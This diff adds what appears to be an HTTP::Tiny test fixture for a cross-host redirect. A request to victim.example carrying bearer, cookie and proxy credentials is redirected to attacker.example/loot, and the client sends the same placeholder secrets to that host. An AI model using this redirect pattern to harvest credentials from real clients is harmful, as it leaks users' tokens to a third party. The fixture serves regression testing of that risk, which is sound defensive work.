@@ -1,0 +1,47 @@
+url
+  http://victim.example/secret
+expected
+  pwned
+expected_url
+  http://attacker.example/loot
+new_args
+  allow_credentialed_redirects: 1
+headers
+  Authorization: Bearer SECRET-TOKEN
+  Cookie: session=SECRET-SESSION
+  Proxy-Authorization: Basic c2VjcmV0OnNlY3JldA==
+----------
+GET /secret HTTP/1.1
+Host: victim.example
+Authorization: Bearer SECRET-TOKEN
+Cookie: session=SECRET-SESSION
+Proxy-Authorization: Basic c2VjcmV0OnNlY3JldA==
+Connection: close
+User-Agent: HTTP-Tiny/VERSION
+
+----------
+HTTP/1.1 302 Found
+Date: Thu, 03 Feb 1994 00:00:00 GMT
+Content-Type: text/plain
+Content-Length: 8
+Location: http://attacker.example/loot
+
+redirect
+
+----------
+GET /loot HTTP/1.1
+Host: attacker.example
+Authorization: Bearer SECRET-TOKEN
+Cookie: session=SECRET-SESSION
+Proxy-Authorization: Basic c2VjcmV0OnNlY3JldA==
+Connection: close
+User-Agent: HTTP-Tiny/VERSION
+
+----------
+HTTP/1.1 200 OK
+Date: Thu, 03 Feb 1994 00:00:00 GMT
+Content-Type: text/plain
+Content-Length: 5
+
+pwned
+
